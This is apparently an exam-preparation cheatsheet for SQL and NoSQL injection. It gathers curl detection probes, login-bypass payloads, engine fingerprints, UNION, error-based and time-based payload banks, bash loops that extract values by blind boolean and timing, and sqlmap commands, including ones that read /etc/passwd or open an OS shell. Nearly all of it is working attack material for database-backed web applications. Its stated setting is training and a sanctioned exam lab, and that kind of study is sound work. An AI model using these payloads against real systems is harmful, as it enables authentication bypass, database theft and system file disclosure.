# 📜 Phase 3 Cheatsheet: Fallbacks and Variants

**Primary playbook:** [🧭 phase-walkthrough.md](<./🧭 phase-walkthrough.md>). Use this file when a walkthrough payload fails, the content-type differs, or you need a longer per-engine list, a manual fallback, or a flag reference. Section names match the walkthrough's **If it fails** lines. Worked, line-by-line solutions for each technique are in [🧪 LABS/SQLi.md](<./🧪 LABS/SQLi.md>).

Placeholders follow the walkthrough: `<URL>`, `<PARAM>`, `<ENGINE>`, `<N>`, `<DB>`, `<TABLE>`, `<COLUMN>`, `<REQ_FILE>`, `<SCHEME>`, `<VHOST>`, `<COOKIE>`, `<PROXY>`. Kali has no internet, so sqlmap's own data and tamper scripts are what you have — nothing here needs an external payload repository.

⚠️ marks a tool I could not confirm as preinstalled on your exam image. Test it once in the drill; if missing, use the curl/Burp fallback next to it, never install.

---

## Detection probe variants

```bash
# POST body, form-encoded, one field at a time
curl -sk -o /tmp/t.html --data-urlencode "<PARAM>=1' AND '1'='1" "<SCHEME>://<VHOST>/<URL>"
curl -sk -o /tmp/f.html --data-urlencode "<PARAM>=1' AND '1'='2" "<SCHEME>://<VHOST>/<URL>"
diff /tmp/t.html /tmp/f.html

# JSON body (jq keeps the quoting correct)
echo '{"<PARAM>":"1"}' | jq '.["<PARAM>"]="1'"'"' AND '"'"'1'"'"'='"'"'1"' | curl -sk -X POST "<SCHEME>://<VHOST>/<URL>" -H "Content-Type: application/json" -d @- -o /tmp/t.html

# XML body
curl -sk -X POST "<SCHEME>://<VHOST>/<URL>" -H "Content-Type: application/xml" --data "<root><PARAM>1' AND '1'='1</PARAM></root>" -o /tmp/t.html

# Multipart form
curl -sk -F "<PARAM>=1' AND '1'='1" "<SCHEME>://<VHOST>/<URL>" -o /tmp/t.html

# Headers and cookies, one at a time
for h in "User-Agent" "Referer" "X-Forwarded-For"; do curl -sk "<SCHEME>://<VHOST>/<URL>" -H "$h: 1' AND '1'='1" -o /tmp/t.html -w "%{size_download}\n"; done
curl -sk "<SCHEME>://<VHOST>/<URL>" -b "<COOKIE>; tracking=1' AND '1'='1" -o /tmp/t.html

# Bulk sweep over a saved parameter list (one per line, from Phase 1 block J)
while read p; do
  s1=$(curl -sk -o /dev/null -w "%{size_download}" --data-urlencode "$p=1' AND '1'='1" -G "<SCHEME>://<VHOST>/<URL>")
  s2=$(curl -sk -o /dev/null -w "%{size_download}" --data-urlencode "$p=1' AND '1'='2" -G "<SCHEME>://<VHOST>/<URL>")
  [ "$s1" != "$s2" ] && echo "$p: $s1 vs $s2 — candidate"
done < recon/params.txt
```

---

## Login bypass payload bank

```text
' OR '1'='1'-- -
' OR '1'='1'#
' OR '1'='1'/*
' OR 1=1-- -
' OR 1=1#
admin'-- -
admin'#
admin' OR '1'='1
") OR ("1"="1"-- -
' OR 'a'='a
'='
1' OR '1'='1' LIMIT 1-- -
```

Field combinations worth trying before giving up on a login form:

| Username | Password | Why |
|---|---|---|
| `' OR '1'='1'-- -` | anything | Comments out the password check entirely |
| `admin'-- -` | anything | Targets a known/guessed username, comments out the password check |
| `' OR 1=1 LIMIT 1-- -` | anything | Forces the query to return exactly one row when `LIMIT 1` without this errors |
| anything | `' OR '1'='1'-- -` | Some apps only parameterise the username, not the password |

---

## DB engine fingerprint reference

| Engine | Error signature | Comment | Concat | Version | Current DB | Table listing |
|---|---|---|---|---|---|---|
| MySQL / MariaDB | "You have an error in your SQL syntax" | `-- ` (trailing space), `#`, `/* */` | `CONCAT(a,b)` | `@@version`, `version()` | `database()` | `information_schema.tables` |
| MSSQL | "Unclosed quotation mark", "Incorrect syntax near" | `--`, `/* */` | `a + b` | `@@version` | `DB_NAME()` | `information_schema.tables` |
| PostgreSQL | "syntax error at or near" | `--`, `/* */` | `a \|\| b` | `version()` | `current_database()` | `information_schema.tables` |
| Oracle | `ORA-00933`, `ORA-01756`, `ORA-00942` | `--`, most queries need `FROM dual` | `a \|\| b` | `banner FROM v$version` | `ora_database_name` | `all_tables` / `all_tab_columns` |
| SQLite | "unrecognized token", `near "..."` | `--`, `/* */` | `a \|\| b` | `sqlite_version()` | file-based, no equivalent | `sqlite_master` |

**Engine-distinguishing probes**, when the error text alone is ambiguous:

```text
' AND '1'='1                 (works everywhere — baseline only)
' AND 1=1-- -                 (MySQL/MSSQL/PostgreSQL/SQLite; Oracle needs FROM dual on most queries)
' UNION SELECT NULL FROM dual-- -    (200/renders only on Oracle)
' AND @@version-- -           (MySQL/MSSQL-specific variable, errors elsewhere)
' AND 1=1::int-- -             (PostgreSQL-specific cast syntax)
```

---

## Union payload bank

```text
-- Column count, binary search instead of counting up one by one
' ORDER BY 10-- -      (too high → error/diff, halve it)
' ORDER BY 5-- -
' ORDER BY 7-- -        (narrow down to the exact count <N>)

-- Version / banner, once <N> and the text column are known
' UNION SELECT NULL,@@version,NULL-- -                                           (MySQL/MSSQL)
' UNION SELECT NULL,version(),NULL-- -                                            (PostgreSQL)
' UNION SELECT NULL,sqlite_version(),NULL-- -                                     (SQLite)
' UNION SELECT NULL,banner,NULL FROM v$version-- -                                (Oracle)

-- Schema discovery, non-Oracle
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema=database()-- -
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='<TABLE>'-- -

-- Schema discovery, Oracle
' UNION SELECT NULL,table_name,NULL FROM all_tables-- -
' UNION SELECT NULL,column_name,NULL FROM all_tab_columns WHERE table_name='<TABLE>'-- -

-- Multiple values in one column
' UNION SELECT NULL,CONCAT(<COLUMN1>,0x3a,<COLUMN2>),NULL FROM <TABLE>-- -                  (MySQL, 0x3a is a colon)
' UNION SELECT NULL,<COLUMN1>||':'||<COLUMN2>,NULL FROM <TABLE>-- -                          (PostgreSQL/Oracle/SQLite)
' UNION SELECT NULL,<COLUMN1>+':'+<COLUMN2>,NULL FROM <TABLE>-- -                            (MSSQL)

-- All rows of a table concatenated into one response (small tables only)
' UNION SELECT NULL,GROUP_CONCAT(<COLUMN> SEPARATOR 0x0a),NULL FROM <TABLE>-- -              (MySQL)
' UNION SELECT NULL,STRING_AGG(<COLUMN>, chr(10)),NULL FROM <TABLE>-- -                       (PostgreSQL)

-- Pagination when a result has too many rows for one page
' UNION SELECT NULL,<COLUMN>,NULL FROM <TABLE> LIMIT 1 OFFSET <N>-- -                        (MySQL/PostgreSQL)
' UNION SELECT NULL,<COLUMN>,NULL FROM (SELECT ROW_NUMBER() OVER (ORDER BY (SELECT NULL)) rn,<COLUMN> FROM <TABLE>) t WHERE rn=<N>-- -   (MSSQL)
' UNION SELECT NULL,<COLUMN>,NULL FROM (SELECT <COLUMN>,ROWNUM rn FROM <TABLE>) WHERE rn=<N>-- -   (Oracle)
```

---

## Error-based payload bank

```text
-- MySQL: XPath functions force the subquery result into the error text
' AND extractvalue(1,concat(0x7e,(SELECT @@version)))-- -
' AND updatexml(1,concat(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 1)),1)-- -
' AND (SELECT 1 FROM (SELECT COUNT(*),concat((SELECT @@version),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -   (double-query, when extractvalue is patched)

-- MSSQL: type conversion forces the value into the error
' AND 1=CONVERT(int,(SELECT @@version))-- -
' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))-- -

-- PostgreSQL: cast forces the value into the error
' AND 1=CAST((SELECT version()) AS int)-- -
' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)-- -

-- Narrowing a truncated value
' AND extractvalue(1,concat(0x7e,SUBSTRING((SELECT @@version),1,30)))-- -
' AND extractvalue(1,concat(0x7e,SUBSTRING((SELECT @@version),31,30)))-- -
```

---

## Blind boolean manual bank

Fallback only — reach for this when sqlmap is confirmed unavailable, never as the default path (hand this to block I of the walkthrough instead).

```bash
# Binary search one character at a time (ASCII 32-126), aimed at ONE value only
VAL=""
for pos in $(seq 1 20); do
  lo=32; hi=126
  while [ $lo -lt $hi ]; do
    mid=$(( (lo + hi + 1) / 2 ))
    code=$(curl -sk -o /dev/null -w "%{size_download}" --data-urlencode "<PARAM>=1' AND ASCII(SUBSTRING((SELECT @@version),$pos,1))>=$mid-- -" -G "<SCHEME>://<VHOST>/<URL>")
    base=$(curl -sk -o /dev/null -w "%{size_download}" --data-urlencode "<PARAM>=1' AND 1=2-- -" -G "<SCHEME>://<VHOST>/<URL>")
    if [ "$code" != "$base" ]; then lo=$mid; else hi=$((mid-1)); fi
  done
  [ $lo -eq 32 ] && break
  VAL="$VAL$(printf \\$(printf '%03o' $lo))"
done
echo "$VAL"
```

> Each character costs ~7 requests (log2 of the 32–126 range). A 20-character value is ~140 requests — minutes, not hours, but still far slower than `sqlmap --technique=B`. Use it only to answer the one value a question names, never to dump a table.

---

## Blind time payload bank

```text
' AND SLEEP(5)-- -                                       (MySQL)
' AND IF(1=1,SLEEP(5),0)-- -                               (MySQL, conditional)
'; WAITFOR DELAY '0:0:5'-- -                               (MSSQL)
'; IF (1=1) WAITFOR DELAY '0:0:5'-- -                       (MSSQL, conditional)
' AND pg_sleep(5)-- -                                      (PostgreSQL)
' AND CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END-- -   (PostgreSQL, conditional)
' AND 1=dbms_pipe.receive_message(('a'),5)-- -              (Oracle, no special privilege needed)
' AND (SELECT COUNT(*) FROM all_users t1,all_users t2,all_users t3)>0-- -   (SQLite/engines without native sleep — heavy cartesian join as a delay)
```

## Time-based manual extraction

Last resort — only when boolean and error both gave nothing (walkthrough block H). Bounded to one value, never a full table.

```bash
VAL=""
for pos in $(seq 1 20); do
  lo=32; hi=126
  while [ $lo -lt $hi ]; do
    mid=$(( (lo + hi + 1) / 2 ))
    t=$(curl -sk -o /dev/null -w "%{time_total}" --data-urlencode "<PARAM>=1' AND IF(ASCII(SUBSTRING((SELECT @@version),$pos,1))>=$mid,SLEEP(3),0)-- -" -G "<SCHEME>://<VHOST>/<URL>")
    awk -v t="$t" 'BEGIN{exit !(t>2.5)}' && lo=$mid || hi=$((mid-1))
  done
  [ $lo -eq 32 ] && break
  VAL="$VAL$(printf \\$(printf '%03o' $lo))"
done
echo "$VAL"
```

> At ~3s per comparison and ~7 comparisons per character, a 10-character value costs roughly 3–4 minutes. Budget accordingly, and confirm the engine (block D) first — a sleep function from the wrong engine silently returns fast every time and looks like "value not found".

---

## sqlmap flag reference

```bash
# Baseline safe run, every time
sqlmap -r <REQ_FILE> -p <PARAM> --batch --technique=BEUSQ --risk=1 --threads=2 --proxy=http://127.0.0.1:8080

# Escalate once, only if the baseline finds nothing
sqlmap -r <REQ_FILE> -p <PARAM> --batch --technique=BEUSQ --risk=1 --threads=2 --level=3 --risk=2

# Skip re-fingerprinting once the engine is already known (faster)
sqlmap -r <REQ_FILE> -p <PARAM> --batch --technique=BEUSQ --risk=1 --threads=2 --dbms=<ENGINE>

# A stuck/aborted previous run (cached fingerprint from an earlier attempt)
sqlmap -r <REQ_FILE> -p <PARAM> --batch --flush-session

# Scoped dump — only the column the question names
sqlmap -r <REQ_FILE> -p <PARAM> --batch --technique=BEUSQ --risk=1 --threads=2 -D <DB> -T <TABLE> -C <COLUMN> --dump

# Current user and privileges, when a question asks "which user runs the query"
sqlmap -r <REQ_FILE> -p <PARAM> --batch --technique=BEUSQ --risk=1 --threads=2 --current-user --is-dba

# Read a file through the DB engine (only if a question explicitly asks for file content via SQLi)
sqlmap -r <REQ_FILE> -p <PARAM> --batch --technique=BEUSQ --risk=1 --threads=2 --file-read=/etc/passwd
```

| Flag | Meaning |
|---|---|
| `--technique=BEUSQ` | Boolean, Error, Union, Stacked, inline Query — every safe technique except `T` (time-based) |
| `--risk=1` | No OR-based or heavy payloads that could alter data. Never raise past `2` on a shared exam target |
| `--level=1`–`5` | How many injection points per request sqlmap tries (headers, cookies, more payload variants). Raise once, to `3`, before giving up |
| `--threads=2` | Keeps the exam VM from freezing. Never raise it |
| `--batch` | Accepts every default prompt — required since nothing can be typed interactively through the saved transcript workflow |
| `-p <PARAM>` | Pins sqlmap to one field instead of retesting the whole request |
| `--proxy=http://127.0.0.1:8080` | Routes sqlmap traffic through Burp, so the run is in your HTTP history as evidence |
| `--flush-session` | Clears a cached fingerprint from a previous aborted run on the same target |
| `--current-db` / `--banner` / `--current-user` / `--is-dba` | One-shot facts, often all a question needs — cheaper than a full dump |
| `--os-shell` | Drops to an OS shell through the DB engine. Rare in this phase's question style and riskier on a shared target — only if a question explicitly asks for OS-level access |

**Why `T` stays out of `--technique`:** sqlmap's default technique set includes time-based blind, which fires one sleep-delayed request per comparison. On a shared exam network that is both slow and a stability risk — a stacked or looping time-based run is the freeze scenario the guideline warns about. Excluding it costs nothing when boolean, error, or union already works; see the walkthrough's block H for the one case where timing is genuinely the only oracle.

---

## NoSQL payload bank

Only when a concrete symptom names a non-relational backend (walkthrough block J) — not a default check.

```text
# Login bypass, operator injection (MongoDB via Express/Mongoose)
?username=admin&password[$ne]=x
?username[$ne]=&password[$ne]=
{"username":"admin","password":{"$ne": null}}
{"username":{"$ne": null},"password":{"$ne": null}}

# $where / $regex for blind-style boolean confirmation
{"username":"admin","password":{"$regex": "^a"}}
{"$where": "this.password.length > 0"}

# $gt / $lt for numeric fields
?id[$gt]=0

# JSON injection into a string-built query (rare, app-specific)
admin", "password": "x" } , { "$or": [ { } ] } , { "ignore": "
```

> No sqlmap-equivalent exists by default — `--dbms=mongodb` is NOT a real sqlmap target; manual testing is the only path. NoSQLMap ⚠️ exists but is unconfirmed on the exam image; do not plan around it.

---

## Tool fallbacks

Kali's defaults (Burp Repeater, curl, sqlmap) cover every technique in this phase. These are optional accelerators only — confirm with `command -v <tool>` before relying on one.

| Tool | Purpose | Fallback |
|---|---|---|
| sqlmap | Automated detection, fingerprinting and dump | The manual payload banks above, by hand in Burp Repeater |
| `jsql-injection` ⚠️ | GUI-driven injection and dump | sqlmap, same flags |
| NoSQLMap ⚠️ | Automated NoSQL injection | The NoSQL payload bank above, by hand |
| Burp Intruder | Bulk payload sweep across many parameters at once | The bulk curl loop under *Detection probe variants* (Community's Intruder is throttled) |

---

## Reading output

```bash
# Diff two saved responses quickly
diff /tmp/true.html /tmp/false.html

# Grep an error signature straight out of a saved response
grep -iE "sql syntax|unclosed quotation|syntax error at or near|ORA-[0-9]{5}|unrecognized token" /tmp/r.html

# sqlmap's own log, to confirm which technique and engine it used without re-reading the whole run
grep -iE "the back-end DBMS is|type:.*technique:|payload:" recon/sqlmap-<NAME>.log

# Response-time check for a single timing probe
curl -sk -o /dev/null -w "%{time_total}\n" --data-urlencode "<PARAM>=<PAYLOAD>" -G "<SCHEME>://<VHOST>/<URL>"
```
